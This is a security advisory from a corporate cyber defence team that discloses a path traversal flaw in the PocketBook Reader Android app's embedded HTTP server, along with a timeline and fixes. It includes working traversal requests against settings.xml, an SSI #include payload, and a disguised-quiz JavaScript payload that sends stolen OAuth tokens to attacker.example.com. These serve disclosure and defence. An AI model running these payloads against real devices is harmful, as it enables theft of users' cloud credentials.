# Migros Security Advisory
This is a security advisory published by the Security Operations / Cyber Defense Center team of MGB (Migros-Genossenschafts-Bund) found during penetration tests or red team engagements.

## PocketBook Reader Android App - Remote Path Traversal Allows Arbitrary File Read and Credential Theft
| Key | Value |
| --- | --- |
| Vendor | PocketBook / Obreey Products |
| Product | PocketBook Reader (Android) |
| Vulnerability | Remote Path Traversal Allows Arbitrary File Read and Credential Theft |
| Affected Versions | 5.65.0.39561.release (com.obreey.reader) |
| URL | [https://play.google.com/store/apps/details?id=com.obreey.reader](https://play.google.com/store/apps/details?id=com.obreey.reader) |
| CVSS 4.0 | 8.3 |
| CWE | CWE-22 |
| CAPEC | CWE-200 |
| MSEC ID | MSEC-2026-007 |
| Vendor ID | Pending |
| CVE ID | CVE-2026-119726 |

## Table of Contents
1. Summary
2. Details
3. Workaround and Fix
4. Credits
5. Timeline
6. References
7. About Us
8. Disclaimer

## 1. Summary
PocketBook Reader (com.obreey.reader) is a popular Android e-book reader application available on the Google Play Store. In version 5.65.0.39561 (confirmed through testing) and probably earlier, the application embeds an HTTP server in its native library (libpocketbook.so) that starts on TCP port 45068 whenever a book is opened. The server binds to all network interfaces (0.0.0.0), not just localhost, and requires no authentication for GET requests. The server's static file handler is vulnerable to path traversal: requests containing "../" sequences in the URL path are not sanitized or confined to the document root, allowing any device on the same network to read arbitrary files accessible to the application process. Since the application holds broad storage permissions (MANAGE_EXTERNAL_STORAGE, READ_EXTERNAL_STORAGE), the impact extends to files across the entire device storage. Most critically, this vulnerability allows extraction of the application's SharedPreferences file containing cloud service OAuth tokens (PocketBook Cloud, Google, Dropbox, bookstore accounts), OPDS catalog credentials, and user profile data. PocketBook Cloud tokens are encrypted with AES using a hardcoded key embedded in the application code, making them trivially decryptable.

There are two independent exploitation paths:

1. WiFi-based (no user interaction): Any device on the same network can directly request files via the path traversal while the victim has any book open. The attacker does not need to control which book is opened. No user interaction beyond normal app usage is required.

2. Internet-based via crafted e-book (user interaction required): An attacker distributes a crafted EPUB containing either (a) an HTML page with JavaScript that performs the path traversal via same-origin XMLHttpRequest and exfiltrates the results to an attacker-controlled server on the Internet, or (b) a .shtml file with SSI #include directives for attacker-selected files. For path (a), the book contains a link (e.g., disguised as an interactive quiz) pointing to http://127.0.0.1:45068/book/<payload>. When the user taps the link and confirms the "follow external link" dialog, the device's browser opens the page served by the embedded HTTP server. Since the browser and the vulnerable server share the same origin (http://127.0.0.1:45068), JavaScript in the page can read arbitrary files via path traversal and exfiltrate them to any server on the Internet. This path does not require the attacker to be on the same WiFi network - distributing the crafted e-book (via email, website, OPDS catalog, or any file sharing mechanism) is sufficient.


## 2. Details
The PocketBook Reader application includes a statically linked embedded HTTP server in its native library libpocketbook.so. The server is implemented in the PocketBook::ReaderLib namespace with the following key functions:
- PocketBook::ReaderLib::process_new_connection(struct mg_connection *)
- PocketBook::ReaderLib::worker_thread(struct mg_context *)
- PocketBook::ReaderLib::send_ssi_file(struct mg_connection *, const char *, struct file *, int)

The server is configured with:
- listening_ports: 45068
- authentication_domain: mydomain.com (Mongoose default, not customized)
- global_passwords_file: not set (no authentication required for GET)
- put_delete_passwords_file: not set (PUT/DELETE return 401 but no valid credentials exist)
- ssi_pattern: **.shtml$|**.shtm$
- cgi_pattern: **.cgi$|**.pl$|**.php$ (compiled in but not exploitable - book content served from ZIP in memory)

The server starts when the user opens any book in the reader. It serves book content (EPUB entries, images, audio tracks) to internal WebViews and media players. The Java code references the server at http://127.0.0.1:45068/book/ for local access, but the Chromecast/audiobook feature (AudiobookPlayerService.java) constructs URLs using the device's WiFi IP address:

```java
String url = "http://" + Formatter.formatIpAddress(
    ((WifiManager) getApplicationContext().getSystemService("wifi"))
    .getConnectionInfo().getIpAddress()
) + ":45068/track/" + this.chapterIndex;
```

This confirms the server binds to all interfaces (0.0.0.0), not just the loopback interface. This is additionally confirmed by netstat output:

```
generic_x86_64_arm64:/ # netstat -tulpen | grep obreey
tcp        0      0 0.0.0.0:45068           0.0.0.0:*               LISTEN      10170      1711848     27170/com.obreey.reader
```

The static file handler does not sanitize path traversal sequences ("../") in the request URI. When the server resolves a URI like /book/../../../etc/hosts, it traverses out of the book's virtual document root and accesses arbitrary filesystem paths. This is a known vulnerability class in Mongoose, which the HTTP server seems to be based on.

The server also processes SSI directives (#include file="...", #include virtual="...") for files with .shtml or .shtm extensions. While the SSI #exec cmd directive was compiled out of this build (the do_ssi_exec() function and its error strings "Bad SSI #exec" / "Cannot SSI #exec" are absent, and popen/pclose are not in the dynamic imports), the #include directive works and can read arbitrary files. A crafted e-book (EPUB) containing a .shtml file with SSI #include directives will have those directives processed server-side when the file is requested via the HTTP server, enabling attacker-predetermined file disclosure.

The application's SharedPreferences file "settings.xml" (accessible via path traversal at /data/data/com.obreey.reader/shared_prefs/settings.xml) contains the key "pref_list_of_cloud_accounts" which stores a JSON array of cloud service account objects including OAuth access tokens and refresh tokens for PocketBook Cloud, Google, Dropbox, and bookstore accounts.

## Exploitation Path 1: WiFi-based (no user interaction)

This path requires the attacker to be on the same network as the victim's device (e.g., the same WiFi network) while the victim has any book open in PocketBook Reader. No interaction with a specific malicious book is required - any open book causes the HTTP server to start.

Step 1: Discover the victim's IP address on the local network (e.g., via ARP scan or mDNS).

Step 2: Read /etc/hosts to confirm the path traversal works:
```
Invoke-WebRequest -Uri "http://<victim-ip>:45068/book/../../../etc/hosts" | Select-Object -ExpandProperty Content
```

Output on a test device:
```
127.0.0.1       localhost
::1             ip6-localhost
```

Step 3: Read the SharedPreferences file containing OAuth tokens:
```
Invoke-WebRequest -Uri "http://<victim-ip>:45068/book/../../../data/data/com.obreey.reader/shared_prefs/settings.xml" | Select-Object -ExpandProperty Content
```

Output on a test device (credentials censored) - please note that on this test device no Google CLoud or Dropbox account was configured but their credentials would also be included here if such accounts were configured:
```
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <long name="last_scan_start_time" value="1787668134176" />
    <string name="pref_list_of_cloud_accounts">[{&quot;provider_id&quot;:&quot;pocketbook_de&quot;,&quot;access_token&quot;:&quot;7wM+3iydm<CENSORED>Hxe2IYg==\n&quot;,&quot;refresh_token&quot;:&quot;7wM+3iydm+1J6fZeInl+BicRfYpDpTMfC\/uj4fGj<CENSORED>Wu9jNCw\n&quot;,&quot;valid_to&quot;:1787849078,&quot;sac_access_token&quot;:&quot;sZ1HAg<CENSORED>8uao\/VxC1N\n&quot;,&quot;sac_refresh_token&quot;:&quot;Paxqa<CENSORED>GT3Ycw3Ys\n&quot;,&quot;sac_valid_to&quot;:1790261081,&quot;api_url&quot;:&quot;https:\/\/pocketbook.de\/graphql&quot;,&quot;store_code&quot;:&quot;de_en&quot;,&quot;user_id&quot;:&quot;7861965&quot;,&quot;email&quot;:&quot;ha<CENSORED>.de&quot;,&quot;firstname&quot;:&quot;Hans&quot;,&quot;lastname&quot;:&quot;Byom&quot;,&quot;need_relogin&quot;:false,&quot;cloud&quot;:&quot;graphql_store&quot;,&quot;synchronize&quot;:false,&quot;auto_upload&quot;:false,&quot;wifi_only&quot;:false,&quot;show_in_all_books&quot;:true,&quot;sync_collections&quot;:true},{&quot;expires_in&quot;:1787676288,&quot;refresh_token&quot;:&quot;dTo0Mz<CENSORED>OTExMg&quot;,&quot;access_token&quot;:&quot;dTo0M<CENSORED>y2MWZjNw&quot;,&quot;login_name&quot;:&quot;ha<CENSORED>.de&quot;,&quot;user_json&quot;:&quot;{\&quot;audio_books_size\&quot;:0,\&quot;books_size\&quot;:0,\&quot;email\&quot;:\&quot;ha<CENSORED>.de\&quot;,\&quot;files_size\&quot;:0,\&quot;files_size_limit\&quot;:5368709120,\&quot;full_name\&quot;:\&quot;ha<CENSORED>.de\&quot;,\&quot;internal_account\&quot;:{\&quot;adobe_uuid\&quot;:\&quot;0cf4bf0c-9d7d-11f1-a368-8ecd8f5cd1a8\&quot;,\&quot;email\&quot;:\&quot;user4<CENSORED>5.pbookde@pbsync.com\&quot;,\&quot;is_main\&quot;:true,\&quot;password\&quot;:\&quot;\\u0013\\n \\u001c!\\u0010\\u0004$\&quot;,\&quot;serial\&quot;:\&quot;D5BA-FC40-98BC-4252\&quot;,\&quot;vendor_id\&quot;:\&quot;pocketbook\&quot;},\&quot;login\&quot;:\&quot;ha<CENSORED>.de\&quot;,\&quot;provider_name\&quot;:\&quot;Pocketbook.de\&quot;,\&quot;register_date\&quot;:\&quot;2026-08-21T16:29:25Z\&quot;,\&quot;role\&quot;:\&quot;USER\&quot;,\&quot;shop\&quot;:{\&quot;home_url\&quot;:\&quot;https:\/\/pocketbook.de\&quot;,\&quot;icon\&quot;:\&quot;https:\/\/pocketbook.de\/static\/version1728478203\/webapi_rest\/_view\/de_DE\/images\/logo.svg\&quot;,\&quot;id\&quot;:\&quot;1\&quot;,\&quot;isbn_search_url\&quot;:\&quot;\&quot;,\&quot;name\&quot;:\&quot;Pocketbook.de\&quot;},\&quot;user_id\&quot;:\&quot;4407655\&quot;}&quot;,&quot;internal_email&quot;:&quot;user4<CENSORED>5.pbookde@pbsync.com&quot;,&quot;cloud&quot;:&quot;pb_cloud&quot;,&quot;synchronize&quot;:true,&quot;auto_upload&quot;:false,&quot;wifi_only&quot;:false,&quot;show_in_all_books&quot;:true,&quot;need_relogin&quot;:false,&quot;sync_collections&quot;:true}]</string>
    <string name="start.act">reader</string>
    <string name="pref.scan.list">{&#10;  &quot;\/storage\/0000-0000&quot;: &quot;SCAN&quot;,&#10;  &quot;\/storage\/emulated\/0&quot;: &quot;SCAN&quot;,&#10;  &quot;\/storage\/emulated\/0\/PocketBook&quot;: &quot;BOOK&quot;&#10;}</string>
    <string name="start.uri">file:///storage/emulated/0/PocketBook/test-book%5B1%5D.epub</string>
    <string name="gui_theme">CTheme6</string>
    <boolean name="gui_book_bg_dark" value="false" />
    <long name="last_autoscan_request_time" value="1787656767557" />
    <string name="start.uri.done">file:///storage/emulated/0/PocketBook/test-book%5B1%5D.epub</string>
</map>
```

Note: Some HTTP clients (browsers, PowerShell's Invoke-WebRequest) normalize "../" out of URLs before sending. Use either a raw TCP connection or percent-encode the dots as %2e to bypass client-side normalization.

For the SSI variant, the attacker must distribute a crafted EPUB containing a .shtml file with #include directives. When the victim opens this book, the attacker can fetch the .shtml page to retrieve pre-selected files:
```
curl http://<victim-ip>:45068/book/payload.shtml
```

Where payload.shtml inside the EPUB contains:
```html
<!--#include file="../../../data/data/com.obreey.reader/shared_prefs/settings.xml" -->
```

Result:
```
Invoke-WebRequest -Uri "http://127.0.0.1:45068/book/creds.shtml" | Select-Object -ExpandProperty Content

<html><body>
<h1>SSI credential theft - PocketBook Reader</h1>
<p>settings.xml (via /data/data/):</p>
<pre><?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <long name="last_scan_start_time" value="1787668134176" />
    <string name="pref_list_of_cloud_accounts">[{&quot;provider_id&quot;:&quot;pocketbook_de&quot;,&quot;access_token&quot;:&quot;7wM+3iyd<CENSORED>xe2IYg==\n&quot;,&quot;refresh_token&quot;:&quot;7wM+3iydm+<CENSORED>ygKWu9jNCw\n&quot;,&quot;valid_to&quot;:1787849078,&quot;sac_access_token&quot;:&quot;sZ1HAg<CENSORED>o\/VxC1N\n&quot;,&quot;sac_refresh_token&quot;:&quot;Paxqa6<CENSORED>DKGT3Ycw3Ys\n&quot;,&quot;sac_valid_to&quot;:1790261081,&quot;api_url&quot;:&quot;https:\/\/pocketbook.de\/graphql&quot;,&quot;store_code&quot;:&quot;de_en&quot;,&quot;user_id&quot;:&quot;7861965&quot;,&quot;email&quot;:&quot;ha<CENSORED>.de&quot;,&quot;firstname&quot;:&quot;Hans&quot;,&quot;lastname&quot;:&quot;Byom&quot;,&quot;need_relogin&quot;:false,&quot;cloud&quot;:&quot;graphql_store&quot;,&quot;synchronize&quot;:false,&quot;auto_upload&quot;:false,&quot;wifi_only&quot;:false,&quot;show_in_all_books&quot;:true,&quot;sync_collections&quot;:true},{&quot;expires_in&quot;:1787676288,&quot;refresh_token&quot;:&quot;dTo0Mz<CENSORED>OTExMg&quot;,&quot;access_token&quot;:&quot;dTo0Mz<CENSORED>Njc2MWZjNw&quot;,&quot;login_name&quot;:&quot;ha<CENSORED>.de&quot;,&quot;user_json&quot;:&quot;{\&quot;audio_books_size\&quot;:0,\&quot;books_size\&quot;:0,\&quot;email\&quot;:\&quot;ha<CENSORED>.de\&quot;,\&quot;files_size\&quot;:0,\&quot;files_size_limit\&quot;:5368709120,\&quot;full_name\&quot;:\&quot;ha<CENSORED>.de\&quot;,\&quot;internal_account\&quot;:{\&quot;adobe_uuid\&quot;:\&quot;0cf4bf0c-9d7d-11f1-a368-8ecd8f5cd1a8\&quot;,\&quot;email\&quot;:\&quot;user4<CENSORED>5.pbookde@pbsync.com\&quot;,\&quot;is_main\&quot;:true,\&quot;password\&quot;:\&quot;\\u0013\\n \\u001c!\\u0010\\u0004$\&quot;,\&quot;serial\&quot;:\&quot;D5BA-FC40-98BC-4252\&quot;,\&quot;vendor_id\&quot;:\&quot;pocketbook\&quot;},\&quot;login\&quot;:\&quot;ha<CENSORED>.de\&quot;,\&quot;provider_name\&quot;:\&quot;Pocketbook.de\&quot;,\&quot;register_date\&quot;:\&quot;2026-08-21T16:29:25Z\&quot;,\&quot;role\&quot;:\&quot;USER\&quot;,\&quot;shop\&quot;:{\&quot;home_url\&quot;:\&quot;https:\/\/pocketbook.de\&quot;,\&quot;icon\&quot;:\&quot;https:\/\/pocketbook.de\/static\/version1728478203\/webapi_rest\/_view\/de_DE\/images\/logo.svg\&quot;,\&quot;id\&quot;:\&quot;1\&quot;,\&quot;isbn_search_url\&quot;:\&quot;\&quot;,\&quot;name\&quot;:\&quot;Pocketbook.de\&quot;},\&quot;user_id\&quot;:\&quot;4407655\&quot;}&quot;,&quot;internal_email&quot;:&quot;user4<CENSORED>5.pbookde@pbsync.com&quot;,&quot;cloud&quot;:&quot;pb_cloud&quot;,&quot;synchronize&quot;:true,&quot;auto_upload&quot;:false,&quot;wifi_only&quot;:false,&quot;show_in_all_books&quot;:true,&quot;need_relogin&quot;:false,&quot;sync_collections&quot;:true}]</string>
    <string name="start.act">reader</string>
    <string name="pref.scan.list">{&#10;  &quot;\/storage\/0000-0000&quot;: &quot;SCAN&quot;,&#10;  &quot;\/storage\/emulated\/0&quot;: &quot;SCAN&quot;,&#10;  &quot;\/storage\/emulated\/0\/PocketBook&quot;: &quot;BOOK&quot;&#10;}</string>
    <string name="start.uri">file:///storage/emulated/0/PocketBook/ssi-test-pborig.epub</string>
    <string name="gui_theme">CTheme6</string>
    <boolean name="gui_book_bg_dark" value="false" />
    <long name="last_autoscan_request_time" value="1787656767557" />
    <string name="start.uri.done">file:///storage/emulated/0/PocketBook/ssi-test-pborig.epub</string>
</map>
</pre>
```

## Exploitation Path 2: Internet-based via crafted e-book (user interaction required)

This path does not require the attacker to be on the same WiFi network. The attacker distributes a crafted EPUB file via any channel (email attachment, website download, OPDS catalog, file sharing). The EPUB contains an HTML page with JavaScript that exploits the path traversal via same-origin requests.

The crafted EPUB contains a normal-looking book chapter with a link disguised as an interactive element (e.g., a reading quiz). The link points to an HTML file inside the EPUB served by the local HTTP server:

```html
<!-- In chapter.xhtml inside the EPUB -->
<a href="http://127.0.0.1:45068/book/quiz.html">Start Reading Quiz</a>
```

The quiz.html file inside the EPUB contains the exfiltration payload:

```html
<!-- quiz.html - served from http://127.0.0.1:45068/book/quiz.html -->
<!-- Visible: a functional quiz. Hidden: credential theft via same-origin XHR. -->
<script>
// Same-origin request to the path-traversal-vulnerable HTTP server
fetch('/book/../../../data/data/com.obreey.reader/shared_prefs/settings.xml')
  .then(function(r) { return r.text(); })
  .then(function(data) {
    // Exfiltrate to attacker's server on the Internet
    new Image().src = 'http://attacker.example.com/collect?d=' +
      encodeURIComponent(btoa(data));
  });
</script>
```

When the victim opens the book and taps the quiz link:
1. PocketBook Reader shows a confirmation dialog: "Follow external link?"
2. If the user taps OK, the device's default browser opens http://127.0.0.1:45068/book/quiz.html
3. The browser loads the page from the embedded HTTP server (same origin: http://127.0.0.1:45068)
4. JavaScript executes and reads the SharedPreferences file via the path traversal (same-origin request, no CORS restrictions)
5. The stolen OAuth tokens are sent to the attacker's server on the Internet via an image beacon or fetch request
6. The user sees a normal-looking quiz page and is unaware of the exfiltration

This attack chain composes the path traversal vulnerability with the application's behavior of serving book content through the HTTP server and allowing external links from within books. The user interaction required is minimal: opening a book and tapping a link that appears to be part of the book's interactive content.


## 3. Workaround and Fix
The following chapter describes how the reported vulnerability can be mitigated (e.g., using a workaround) and if available sustainably fixed.
### Workaround
For the WiFi-based attack path: Users should avoid opening books in PocketBook Reader while connected to untrusted networks (public WiFi, shared networks). The HTTP server only runs while a book is actively open in the reader. Closing the book or the application stops the server.

For the Internet-based attack path: Users should not open e-books from untrusted sources, and should not tap links within e-books that open external content. However, this is difficult to enforce in practice since the malicious EPUB appears to be a normal book with legitimate interactive content.


### Fix
The vendor should apply the following fixes:
1. Bind the HTTP server to the loopback interface (127.0.0.1) only. If network access is required for Chromecast functionality, implement authentication and restrict access to the specific Chromecast device.
2. Sanitize all URI paths by resolving canonical paths and verifying the result remains within the book's document root. Reject any path containing ".." traversal sequences.
3. Disable SSI processing entirely unless strictly required. If SSI is needed, restrict #include paths to the document root.
4. Consider replacing the embedded Mongoose 3.x server with a modern, maintained HTTP server library. Mongoose 3.x is from circa 2013 and no longer receives security updates.
5. Restrict external links from within books: validate that link targets use only http/https schemes pointing to legitimate external URLs. Do not allow links to localhost or 127.0.0.1 from book content, as this enables same-origin JavaScript access to the embedded HTTP server.
6. Store OAuth tokens using Android's EncryptedSharedPreferences with keys backed by the Android Keystore, rather than using a hardcoded AES key. Even if the file is read, tokens should not be decryptable without the device's hardware-backed keys.



## 4. Credits
- Rafael Fedler, Migros-Genossenschafts-Bund (MGB)

## 5. Timeline
| Date | Process | Comments |
| --- | --- | --- |
| 12-08-2026 | Vulnerability Discovery | Vulnerability discovered during security review of PocketBook Reader Android application |
| 24-08-2026 | Vendor Notification | Contacted vendor via e-mail to inform of this vulnerability |
| 27-08-2026 | Vendor Receipt | Vendor confirmed they received the vulnerability report |
| 11-09-2026 | Vendor Validation | Vendor confirms they started working on a fix |
| 23-10-2026 | Vendor Validation | Migros asks when security patch to Android app can be expected |
| 23-10-2026 | Vendor Validation | Vendor promises patches to Android app within two weeks |
| 10-11-2026 | Vendor Validation | Migros contacts vendor again |
| 10-11-2026 | Vendor Validation | Vendor states update will be released in two days |
| 10-11-2026 | Vendor Resolution | Update released to Google Play Store |
| 13-11-2026 | Advisory Release | Advisory released by Migros to GitHub |

## 6. References
- [https://play.google.com/store/apps/details?id=com.obreey.reader](https://play.google.com/store/apps/details?id=com.obreey.reader)

## 7. About Us
The MGB (Migros-Genossenschafts-Bund) is the central service company of the Migros Group and offers around 350 different functions. For this reason, we are always on the lookout for specialists from a wide range of fields. You can find us on [jobs.migros.ch](https://migros-gruppe.jobs/de/unsere-unternehmen/migros-gruppe/offene-stellen?q=cyber).


## 8. Disclaimer
The MGB (Migros-Genossenschafts-Bund) works with suppliers to mitigate identified vulnerabilities as best as possible. The publication of vulnerabilities without the availability of a suitable corrective measure (patch) is not the goal of the MGB. The full disclosure of a vulnerability is only used by MGB in exceptional cases. The protection of the Migros community, especially those who are in a contractual relationship, must be guaranteed in any case and MGB will act in their interests.


